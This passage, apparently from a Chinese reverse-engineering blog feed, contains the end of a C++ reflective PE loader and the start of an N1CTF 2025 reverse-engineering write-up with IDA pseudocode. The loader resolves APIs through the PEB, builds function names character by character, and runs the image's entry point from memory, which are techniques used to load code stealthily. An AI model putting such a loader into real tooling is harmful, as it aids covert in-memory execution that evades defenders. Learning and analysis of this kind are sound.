class="line">        dst[i] = src[i];                     <span class="comment">// 逐字节复制</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//复制节区表</span></span><br><span class="line">    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNTheader + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">    DWORD SecNum = pNTheader-&gt;FileHeader.NumberOfSections;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SecNum; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pSec-&gt;SizeOfRawData == <span class="number">0</span> || pSec-&gt;PointerToRawData == <span class="number">0</span>) &#123;</span><br><span class="line">            pSec++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* chSrcMem = (<span class="type">char</span>*)((ULONG_PTR)pDll + (DWORD)(pSec-&gt;PointerToRawData));</span><br><span class="line">        <span class="type">char</span>* chDestMem = (<span class="type">char</span>*)((ULONG_PTR)pAlloc + (DWORD)(pSec-&gt;VirtualAddress));</span><br><span class="line">        DWORD dwSizeOfRawData = pSec-&gt;SizeOfRawData;</span><br><span class="line">        DWORD dwVirtualSize = pSec-&gt;Misc.VirtualSize;</span><br><span class="line">        <span class="keyword">for</span> (DWORD j = <span class="number">0</span>; j &lt; dwSizeOfRawData; j++) &#123;</span><br><span class="line">            chDestMem[j] = chSrcMem[j];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dwVirtualSize &gt; dwSizeOfRawData) &#123;</span><br><span class="line">            <span class="type">char</span>* start = chDestMem + dwSizeOfRawData;</span><br><span class="line">            <span class="type">char</span>* end = chDestMem + dwVirtualSize;</span><br><span class="line">            <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">                *start++ = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pSec++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//杜哥部分登场</span></span><br><span class="line">    <span class="comment">//开始检测并加载重定位表</span></span><br><span class="line">    PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pNTheader-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress + (ULONG_PTR)pAlloc);</span><br><span class="line">    <span class="comment">//重定位表指针通过NT结构的数据目录表查找到位置</span></span><br><span class="line">    <span class="type">int</span> SizeOfBaseReloc = pNTheader-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].Size;<span class="comment">//重定位表的大小也在NT结构中 </span></span><br><span class="line">    <span class="keyword">if</span> (pNTheader-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            PWORD TypeOffset = (WORD*)((PBYTE)pBaseReloc + <span class="number">8</span>);          <span class="comment">//跳过前两个元素（不过在有的结构声明中TypeOffset不属于该结构</span></span><br><span class="line">            <span class="type">int</span> num = (pBaseReloc-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;                <span class="comment">//SizeOfBlock规定的是该单元的大小以及TypeOffset是一字的</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                WORD type = TypeOffset[i] &gt;&gt; <span class="number">12</span>;                        <span class="comment">//TypeOffset[i] &gt;&gt; 12相当于在查找TypeOffset的前四字节（类型）</span></span><br><span class="line">                WORD offset = TypeOffset[i] &amp; <span class="number">0x0FFF</span>;                   <span class="comment">//去掉类型（前四字节）</span></span><br><span class="line">                <span class="type">int</span> differ = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (type == <span class="number">3</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    differ = *((ULONG_PTR*)(offset + pBaseReloc-&gt;VirtualAddress + pAlloc)) - pNTheader-&gt;OptionalHeader.ImageBase;</span><br><span class="line">                    ULONG_PTR p = (ULONG_PTR)pAlloc + differ;</span><br><span class="line">                    <span class="type">char</span>* tagetaddr = (<span class="type">char</span>*)(ULONG_PTR)pAlloc + offset + pBaseReloc-&gt;VirtualAddress;</span><br><span class="line">                    <span class="type">char</span>* fromeaddr = (<span class="type">char</span>*)p;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>;c &lt; <span class="number">4</span>;c++) &#123;</span><br><span class="line">                        tagetaddr[c] = fromeaddr[c];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            SizeOfBaseReloc -= pBaseReloc-&gt;SizeOfBlock;                 <span class="comment">//通过字节大小来间接表示个数</span></span><br><span class="line">            pBaseReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pBaseReloc + pBaseReloc-&gt;SizeOfBlock);<span class="comment">//相当于结构指针++了，不过这么看来TypeOffset好像真不属于这个结构</span></span><br><span class="line">        &#125; <span class="keyword">while</span> (SizeOfBaseReloc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//导入表的处理</span></span><br><span class="line">    <span class="comment">//因为导入表还没有修复，所以里面的API大部分都是无法使用的，可避免的我都去避免了</span></span><br><span class="line">    <span class="comment">// 但是是在无法避免的如，LoadLibrary函数无法找到，就需要通过</span></span><br><span class="line">    <span class="comment">// TEB和PEB的帮助找到了</span></span><br><span class="line">    <span class="comment">//GetProcAddress的地址</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* GETPROCADDR)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line">    <span class="comment">//LoadLibrary的地址</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* LOADLIBRARYA)</span><span class="params">(LPCSTR)</span></span>;</span><br><span class="line"></span><br><span class="line">    GETPROCADDR pGetProcAddress = <span class="literal">NULL</span>;</span><br><span class="line">    LOADLIBRARYA pLoadLibraryA = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到TEB的地址，通过TEB找到PEB</span></span><br><span class="line">    PTEB pTEB = (PTEB)__readgsqword(<span class="number">0x30</span>);</span><br><span class="line">    PPEB pPEB = pTEB-&gt;ProcessEnvironmentBlock;</span><br><span class="line">    <span class="comment">// 获取PEB.Ldr</span></span><br><span class="line">    PPEB_LDR_DATA pLdr = pPEB-&gt;Ldr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历模块列表，找到 kernel32.dll</span></span><br><span class="line">    PLIST_ENTRY pListHead = &amp;pLdr-&gt;InMemoryOrderModuleList;</span><br><span class="line">    PLIST_ENTRY pCurrentEntry = pListHead-&gt;Flink;</span><br><span class="line">    <span class="keyword">while</span> (pCurrentEntry &amp;&amp; pCurrentEntry != pListHead)</span><br><span class="line">    &#123;</span><br><span class="line">        PLDR_DATA_TABLE_ENTRY pEntry = <span class="built_in">CONTAINING_RECORD</span>(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">        <span class="keyword">if</span> (pEntry &amp;&amp; pEntry-&gt;FullDllName.Buffer)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">wchar_t</span>* dllName = pEntry-&gt;FullDllName.Buffer;</span><br><span class="line">            <span class="comment">// 提取 DLL 名称</span></span><br><span class="line">            <span class="type">wchar_t</span>* fileName = <span class="built_in">ExtractDllName</span>(dllName);</span><br><span class="line">            <span class="comment">// 目标 DLL 名称kernel32.dll</span></span><br><span class="line">            <span class="type">wchar_t</span> a[<span class="number">50</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            a[<span class="number">0</span>] = <span class="string">L&#x27;k&#x27;</span>;</span><br><span class="line">            a[<span class="number">1</span>] = <span class="string">L&#x27;e&#x27;</span>;</span><br><span class="line">            a[<span class="number">2</span>] = <span class="string">L&#x27;r&#x27;</span>;</span><br><span class="line">            a[<span class="number">3</span>] = <span class="string">L&#x27;n&#x27;</span>;</span><br><span class="line">            a[<span class="number">4</span>] = <span class="string">L&#x27;e&#x27;</span>;</span><br><span class="line">            a[<span class="number">5</span>] = <span class="string">L&#x27;l&#x27;</span>;</span><br><span class="line">            a[<span class="number">6</span>] = <span class="string">L&#x27;3&#x27;</span>;</span><br><span class="line">            a[<span class="number">7</span>] = <span class="string">L&#x27;2&#x27;</span>;</span><br><span class="line">            a[<span class="number">8</span>] = <span class="string">L&#x27;.&#x27;</span>;</span><br><span class="line">            a[<span class="number">9</span>] = <span class="string">L&#x27;d&#x27;</span>;</span><br><span class="line">            a[<span class="number">10</span>] = <span class="string">L&#x27;l&#x27;</span>;</span><br><span class="line">            a[<span class="number">11</span>] = <span class="string">L&#x27;l&#x27;</span>;</span><br><span class="line">            a[<span class="number">12</span>] = <span class="string">L&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">CompareDllName</span>(fileName, a)) &#123;</span><br><span class="line">                <span class="comment">//分析PE文件找到导出表</span></span><br><span class="line">                HMODULE hKernel32 = (HMODULE)pEntry-&gt;DllBase;</span><br><span class="line">                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hKernel32 + ((PIMAGE_DOS_HEADER)hKernel32)-&gt;e_lfanew);</span><br><span class="line">                <span class="comment">// 获取导出表的地址</span></span><br><span class="line">                PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hKernel32 + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">                <span class="comment">// 获取导出表的各个信息</span></span><br><span class="line">                DWORD* pFunctionNames = (DWORD*)((BYTE*)hKernel32 + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">                DWORD* pFunctionAddresses = (DWORD*)((BYTE*)hKernel32 + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">                WORD* pFunctionOrdinals = (WORD*)((BYTE*)hKernel32 + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 遍历导出表，查找 LoadLibraryA</span></span><br><span class="line">                <span class="type">char</span> targetName1[<span class="number">50</span>] = <span class="string">&quot;LoadLibraryA&quot;</span>;</span><br><span class="line">                targetName1[<span class="number">0</span>] = <span class="string">&#x27;L&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">1</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">2</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">3</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">4</span>] = <span class="string">&#x27;L&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">5</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">6</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">7</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">8</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">9</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">10</span>] = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">11</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">                targetName1[<span class="number">12</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="comment">// 遍历导出表，查找 GetProcAddress</span></span><br><span class="line">                <span class="type">char</span> targetName2[<span class="number">50</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">                targetName2[<span class="number">0</span>] = <span class="string">&#x27;G&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">2</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">3</span>] = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">4</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">5</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">6</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">7</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">8</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">9</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">10</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">11</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">12</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">13</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">                targetName2[<span class="number">14</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="type">int</span> isP = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">                    <span class="type">char</span>* functionName = (<span class="type">char</span>*)((BYTE*)hKernel32 + pFunctionNames[i]);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">CompareStrings</span>(functionName, targetName1)) &#123;</span><br><span class="line">                        <span class="comment">// 找到函数名，获取其地址</span></span><br><span class="line">                        DWORD functionRVA = pFunctionAddresses[pFunctionOrdinals[i]];</span><br><span class="line">                        pLoadLibraryA = (LOADLIBRARYA)((BYTE*)hKernel32 + functionRVA);</span><br><span class="line">                        isP++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">CompareStrings</span>(functionName, targetName2)) &#123;</span><br><span class="line">                        <span class="comment">// 找到函数名，获取其地址</span></span><br><span class="line">                        DWORD functionRVA = pFunctionAddresses[pFunctionOrdinals[i]];</span><br><span class="line">                        pGetProcAddress = (GETPROCADDR)((BYTE*)hKernel32 + functionRVA);</span><br><span class="line">                        isP++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (isP == <span class="number">2</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 找到后退出</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pCurrentEntry = pCurrentEntry-&gt;Flink;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pLoadLibraryA &amp;&amp; !pGetProcAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> foece[] = <span class="string">&quot;无法获取 LoadLibraryA 地址，请检查目标进程模块&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> sucsess[] = <span class="string">&quot;sucsess&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pNTheader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + pAlloc);</span><br><span class="line">    <span class="comment">//这个是IID的指针</span></span><br><span class="line">    <span class="keyword">if</span> (pImport != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (pImport-&gt;Name != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> DLLname[<span class="number">50</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// 定义一个存储 DLL 名称的缓冲区</span></span><br><span class="line">            <span class="type">char</span>* pDLLName = (<span class="type">char</span>*)(pImport-&gt;Name + pAlloc); <span class="comment">// 获取 DLL 名称的地址</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 手动将名称拷贝到 DLLname 缓冲区</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(DLLname) - <span class="number">1</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (pDLLName[i] == <span class="string">&#x27;\0&#x27;</span>) <span class="comment">// 遇到字符串结束符时停止</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                DLLname[i] = pDLLName[i]; <span class="comment">// 拷贝字符</span></span><br><span class="line">            &#125;</span><br><span class="line">            DLLname[<span class="built_in">sizeof</span>(DLLname) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 确保缓冲区以 &#x27;\0&#x27; 结尾</span></span><br><span class="line"></span><br><span class="line">            HMODULE hProcess = <span class="built_in">pLoadLibraryA</span>(DLLname);               <span class="comment">//通过名称找句柄</span></span><br><span class="line">            <span class="keyword">if</span> (!hProcess)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            &#125;</span><br><span class="line">            PIMAGE_THUNK_DATA64 pINT = (PIMAGE_THUNK_DATA64)(pImport-&gt;OriginalFirstThunk + pAlloc);</span><br><span class="line">            PIMAGE_THUNK_DATA64 pIAT = (PIMAGE_THUNK_DATA64)(pImport-&gt;FirstThunk + pAlloc);</span><br><span class="line">            <span class="keyword">while</span> ((ULONG_PTR)(pINT-&gt;u<span class="number">1.</span>AddressOfData) != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                PIMAGE_IMPORT_BY_NAME pFucname = (PIMAGE_IMPORT_BY_NAME)(pINT-&gt;u<span class="number">1.</span>AddressOfData + pAlloc);  <span class="comment">//找DLL中函数的名字</span></span><br><span class="line">                <span class="keyword">if</span> (pINT-&gt;u<span class="number">1.</span>AddressOfData &amp; IMAGE_ORDINAL_FLAG32)<span class="comment">//判断如果是序号就是第一种处理方式</span></span><br><span class="line">                &#123;</span><br><span class="line">                    pIAT-&gt;u<span class="number">1.</span>AddressOfData = (ULONG_PTR)(<span class="built_in">pGetProcAddress</span>(hProcess, (LPCSTR)(pINT-&gt;u<span class="number">1.</span>AddressOfData)));<span class="comment">//通过序号来获取地址</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    pIAT-&gt;u<span class="number">1.</span>AddressOfData = (ULONG_PTR)(<span class="built_in">pGetProcAddress</span>(hProcess, pFucname-&gt;Name));             <span class="comment">//通过函数名来获取地址</span></span><br><span class="line">                &#125;</span><br><span class="line">                pINT++;</span><br><span class="line">                pIAT++;</span><br><span class="line">            &#125;</span><br><span class="line">            pImport++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//最后的操作就是修正程序的入口地址</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(pAlloc + pDOSheader-&gt;e_lfanew);</span><br><span class="line">    FARPROC EOP = (FARPROC)((LPBYTE)pAlloc + pNT-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">EOP</span>();</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      
      
      <categories>
          
          <category> 逆向行驶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n1ctf2025-re-wp</title>
      <link href="/2025/02/11/2025n1ctf/"/>
      <url>/2025/02/11/2025n1ctf/</url>
      
        <content type="html"><![CDATA[<p>写了逆向方向两个题5mc,df5</p><span id="more"></span><h2 id="5mc"><a href="#5mc" class="headerlink" title="5mc"></a>5mc</h2><p>拖进ida，32位，后面有一段比较冗长但又难以理解的代码，实际作用是在初始化后续的加密段</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">sub_7FF67C8E1020</span>(<span class="string">&quot;flag:&quot;</span>, argv, envp);</span><br><span class="line">  <span class="built_in">sub_7FF67C8E1080</span>(<span class="string">&quot;%s&quot;</span>, Buf1);</span><br><span class="line">  n32_2 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++n32_2;</span><br><span class="line">  <span class="keyword">while</span> ( Buf1[n32_2] );</span><br><span class="line">  <span class="keyword">if</span> ( n32_2 == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x1BF52u</span>);</span><br><span class="line">    box = box;</span><br><span class="line">    n256 = <span class="number">0</span>;</span><br><span class="line">    v9 = off_7FF67C905070;</span><br><span class="line">    box_1 = box;</span><br><span class="line">    v11 = off_7FF67C905078;</span><br><span class="line">    v12 = off_7FF67C905080;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      *box_1++ = n256++;</span><br><span class="line">    <span class="keyword">while</span> ( n256 &lt; <span class="number">256</span> );</span><br><span class="line">    n512 = <span class="number">512LL</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="built_in">rand</span>();</span><br><span class="line">      v15 = <span class="built_in">rand</span>();</span><br><span class="line">      v16 = box[v14];</span><br><span class="line">      box[v14] = box[v15];</span><br><span class="line">      box[v15] = v16;</span><br><span class="line">      --n512;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n512 );</span><br><span class="line">    n32 = <span class="number">0</span>;</span><br><span class="line">    v18 = v9;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      *v18++ = n32++;</span><br><span class="line">    <span class="keyword">while</span> ( n32 &lt; <span class="number">32</span> );</span><br><span class="line">    n32_1 = <span class="number">32LL</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="built_in">rand</span>() % <span class="number">32</span>;</span><br><span class="line">      v21 = <span class="built_in">rand</span>() % <span class="number">32</span>;</span><br><span class="line">      v22 = v9[v20];</span><br><span class="line">      v9[v20] = v9[v21];</span><br><span class="line">      v9[v21] = v22;</span><br><span class="line">      --n32_1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n32_1 );</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">      v11[i] = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">      v12[j] = <span class="built_in">rand</span>();</span><br><span class="line">    n17 = <span class="number">0</span>;</span><br><span class="line">    v26 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v27 = <span class="built_in">VirtualAlloc</span>(<span class="number">0LL</span>, <span class="number">0xD2uLL</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">      lpAddress[v26] = v27;</span><br><span class="line">      <span class="keyword">if</span> ( !v27 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      v28 = v43[v26];</span><br><span class="line">      ++n17;</span><br><span class="line">      ++v26;</span><br><span class="line">      *v27 = *v28;</span><br><span class="line">      v27[<span class="number">1</span>] = v28[<span class="number">1</span>];</span><br><span class="line">      v27[<span class="number">2</span>] = v28[<span class="number">2</span>];</span><br><span class="line">      v27[<span class="number">3</span>] = v28[<span class="number">3</span>];</span><br><span class="line">      v27[<span class="number">4</span>] = v28[<span class="number">4</span>];</span><br><span class="line">      v27[<span class="number">5</span>] = v28[<span class="number">5</span>];</span><br><span class="line">      v27[<span class="number">6</span>] = v28[<span class="number">6</span>];</span><br><span class="line">      v29 = v28[<span class="number">7</span>];</span><br><span class="line">      v28 += <span class="number">8</span>;</span><br><span class="line">      v27[<span class="number">7</span>] = v29;</span><br><span class="line">      v27[<span class="number">8</span>] = *v28;</span><br><span class="line">      v27[<span class="number">9</span>] = v28[<span class="number">1</span>];</span><br><span class="line">      v27[<span class="number">10</span>] = v28[<span class="number">2</span>];</span><br><span class="line">      v27[<span class="number">11</span>] = v28[<span class="number">3</span>];</span><br><span class="line">      v27[<span class="number">12</span>] = v28[<span class="number">4</span>];</span><br><span class="line">      *(v27 + <span class="number">104</span>) = *(v28 + <span class="number">40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n17 &lt; <span class="number">17</span> );</span><br><span class="line">    lpAddress_1 = lpAddress[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0LL</span>; k &lt; <span class="number">16</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0LL</span>; m &lt; <span class="number">17</span>; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( m != k + <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v33 = lpAddress[m];</span><br><span class="line">          n192 = <span class="number">0LL</span>;</span><br><span class="line">          v35 = lpAddress[k + <span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> ( v33 &lt;= (v35 + <span class="number">209</span>) &amp;&amp; &amp;v33[<span class="number">13</span>].m128i_i8[<span class="number">1</span>] &gt;= v35 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">          v36 = v33 + <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            v37 = _mm_loadu_si128(v36 - <span class="number">2</span>);</span><br><span class="line">            v36 += <span class="number">4</span>;</span><br><span class="line">            v38 = 